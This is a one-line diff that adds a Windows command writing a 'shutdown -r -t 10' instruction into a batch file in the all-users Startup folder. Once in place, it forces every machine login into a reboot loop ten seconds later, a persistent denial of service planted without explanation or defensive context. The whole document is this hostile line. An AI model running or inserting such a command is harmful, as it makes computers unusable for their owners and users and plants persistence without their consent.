@@ -1,0 +1,1 @@
+echo shutdown -r -t 10 >>"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\Rebooting.bat"
